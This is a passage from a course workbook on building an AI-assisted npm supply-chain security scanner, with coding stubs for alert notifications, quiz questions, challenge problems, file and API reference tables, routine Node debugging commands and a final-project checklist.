    async sendEmailAlert(alert) {
        // Send alert via email
        // YOUR CODE HERE
    }

    async sendTeamsAlert(alert) {
        // Send alert to Teams
        // YOUR CODE HERE
    }

    getChannelForSeverity(severity) {
        // Determine which channels to use
        // YOUR CODE HERE
    }
}

// Test notifications
const notifier = new NotificationService();
await notifier.sendAlert({
    severity: 'CRITICAL',
    title: 'Critical Vulnerability Found',
    message: 'Package express@4.18.2 has a critical vulnerability',
    details: 'CVE-2023-12345: Remote Code Execution',
    packageName: 'express',
    version: '4.18.2'
});
```

**🔍 Observation Questions:**

1. When would you send a Slack notification vs. an email?
_________________________________________________________________
2. What information should be included in a security alert?
_________________________________________________________________
3. How would you handle rate limiting for notifications?
_________________________________________________________________

#### Check Your Understanding (Module 4.3)

**Multiple Choice:**

1. What happens when a critical vulnerability is found in CI/CD?
   - [ ] The build continues
   - [ ] The build is paused
   - [ ] The build fails
   - [ ] The build is restarted

2. Which notification channel is best for urgent alerts?
   - [ ] Email
   - [ ] Slack
   - [ ] SMS
   - [ ] All of the above

3. True or False: Webhooks can be used to integrate with custom systems.
   - [ ] True
   - [ ] False

**Short Answer:**

4. How would you handle a security alert at 2 AM?
_________________________________________________________________
5. What information should the CI/CD report contain?
_________________________________________________________________

---

### Module 4.4: Module 4 Review

#### Self-Assessment

Rate your understanding of each topic (1 = Need Help, 5 = Expert):

| Topic | 1 | 2 | 3 | 4 | 5 |
|-------|---|---|---|---|---|
| LLM Integration | ○ | ○ | ○ | ○ | ○ |
| Prompt Engineering | ○ | ○ | ○ | ○ | ○ |
| Schema Validation | ○ | ○ | ○ | ○ | ○ |
| CI/CD Integration | ○ | ○ | ○ | ○ | ○ |
| Webhooks | ○ | ○ | ○ | ○ | ○ |
| Notifications | ○ | ○ | ○ | ○ | ○ |

#### Module 4 Challenge Problems

**Challenge 1: Custom AI Analysis**

Write a function that uses AI to generate a security summary for a package.

```javascript
async function generateSecuritySummary(packageData) {
    // YOUR CODE HERE
    
    // Return { summary, riskLevel, recommendations }
}
```

**Challenge 2: Automated Remediation**

Implement a system that suggests fixes for vulnerabilities.

```javascript
function suggestFix(vulnerability) {
    // YOUR CODE HERE
    
    // Return { action, command, description }
}
```

**Challenge 3: Security Dashboard**

Design a dashboard for monitoring security status.

```javascript
class SecurityDashboard {
    constructor() {
        // YOUR CODE HERE
    }

    generateDashboard(scanResults) {
        // YOUR CODE HERE
    }
}
```

---

## APPENDIX A: CODE REFERENCE

### Complete File List

```
beyond-cves-tutorial/
├── phase-1/
│   ├── 01-call-stack-visualizer.js
│   ├── 02-event-loop-demo.js
│   ├── 03-event-loop-phases.js
│   ├── 04-malicious-package-simulator.js
│   ├── 05-install-monitor.js
│   ├── 06-lifecycle-tracer.js
│   ├── 07-malicious-detector.js
│   ├── 08-complete-scanner.js
│   ├── 09-ci-integration.js
│   └── package.json
├── phase-2/
│   ├── src/
│   │   ├── package-analyzer.js
│   │   ├── capability-scanner.js
│   │   ├── socket-integration.js
│   │   ├── snyk-integration.js
│   │   └── comparative-analyzer.js
│   ├── test-analyzer.js
│   ├── test-capability-scanner.js
│   ├── test-comparative.js
│   └── package.json
├── phase-3/
│   ├── src/
│   │   ├── concurrency-controller.js
│   │   ├── package-scanner.js
│   │   ├── resource-manager.js
│   │   ├── priority-queue.js
│   │   ├── streaming-results.js
│   │   └── orchestrator.js
│   ├── test-scanner.js
│   ├── test-orchestrator.js
│   └── package.json
├── phase-4/
│   ├── src/
│   │   ├── llm-service.js
│   │   ├── schema-validator.js
│   │   ├── policy-engine.js
│   │   ├── ai-orchestrator.js
│   │   ├── webhook-server.js
│   │   ├── notification-service.js
│   │   └── github-actions-integration.js
│   ├── ci-cd-integration.js
│   ├── test-ai-orchestrator.js
│   ├── Dockerfile
│   ├── .env.example
│   ├── .github/workflows/security-scan.yml
│   └── package.json
└── README.md
```

### Key Function Reference

| Function | Purpose | Location |
|----------|---------|----------|
| `analyzePackage()` | Analyze package.json | phase-2/src/package-analyzer.js |
| `scanCapabilities()` | Detect package capabilities | phase-2/src/capability-scanner.js |
| `compareAnalyses()` | Compare Socket and Snyk | phase-2/src/comparative-analyzer.js |
| `processConcurrent()` | Process items in parallel | phase-3/src/concurrency-controller.js |
| `analyzeWithAI()` | AI-powered analysis | phase-4/src/llm-service.js |
| `validateSchema()` | Validate JSON output | phase-4/src/schema-validator.js |
| `evaluatePolicy()` | Enforce security policies | phase-4/src/policy-engine.js |

---

## APPENDIX B: API REFERENCE

### Socket API

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/packages/{name}` | GET | Get package analysis |
| `/packages/{name}/capabilities` | GET | Get package capabilities |
| `/packages/{name}/risks` | GET | Get package risks |
| `/scan` | POST | Scan a project |

### Snyk API

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/vulnerabilities` | GET | Get vulnerabilities |
| `/dependencies` | GET | Get dependency tree |
| `/remediation` | GET | Get remediation advice |
| `/orgs/{orgId}/projects` | POST | Create project scan |

---

## APPENDIX C: TROUBLESHOOTING GUIDE

### Common Issues and Solutions

| Issue | Cause | Solution |
|-------|-------|----------|
| API rate limit | Too many requests | Increase delay, use cache |
| Memory exhaustion | Too many packages | Reduce concurrency |
| Invalid API key | Wrong key | Check environment variables |
| Timeout | Slow processing | Increase timeout value |
| Schema validation error | Malformed AI output | Check prompt format |
| Duplicate package names | NPM conflicts | Check package.json |

### Debugging Commands

```bash
# Check environment variables
env | grep API_KEY

# Debug Node.js
node --inspect-brk your-script.js

# Check memory usage
node --trace-gc your-script.js

# Profile performance
node --prof your-script.js

# Check NPM logs
npm config get logs

# Clean install
rm -rf node_modules package-lock.json
npm install
```

---

## APPENDIX D: FINAL PROJECT

### Project: Complete Security System

**Objective:** Build a complete security scanning system that integrates all components from the course.

**Requirements:**

1. **Package Scanner**: Scan package.json and lock files
2. **Capability Scanner**: Detect dangerous capabilities
3. **AI Analysis**: Generate intelligent analysis
4. **Policy Engine**: Enforce security policies
5. **CI/CD Integration**: Work with GitHub Actions
6. **Notifications**: Send alerts via Slack/Email
7. **Reporting**: Generate comprehensive reports

**Deliverables:**

1. Working security scanner
2. AI analysis integration
3. CI/CD workflow
4. Documentation
5. Test suite

**Evaluation Criteria:**

- Code quality and organization
- Security coverage
- Performance and scalability
- Documentation completeness
- Test coverage

**Submission:** Submit your code repository with:
- All source files
- README with setup instructions
- Test results
- Sample reports

---

## COURSE COMPLETION CHECKLIST

### Phase 1: Foundations
- [ ] JavaScript execution model understood
- [ ] npm lifecycle understood
- [ ] Malicious script detector built
- [ ] Security scanner built

### Phase 2: Modern Dependency Risk Analysis
- [ ] Package analyzer built
- [ ] Capability scanner built
- [ ] Socket integration completed
- [ ] Snyk integration completed
- [ ] Comparative analysis completed

### Phase 3: Async Execution & Orchestration
- [ ] Concurrency controller built
- [ ] Resource manager built
- [ ] Priority queue implemented
- [ ] Orchestrator built

### Phase 4: AI-Augmented Security
- [ ] LLM service built
- [ ] Prompt templates created
- [ ] Schema validator built
- [ ] Policy engine built
- [ ] CI/CD integration completed

### Final Project
- [ ] Complete system built
- [ ] Documentation written
- [ ] Tests passing
- [ ] Presentation ready

---

**🎉 Congratulations on completing this course!** You now have a complete, production-ready, AI-augmented software supply chain security system.
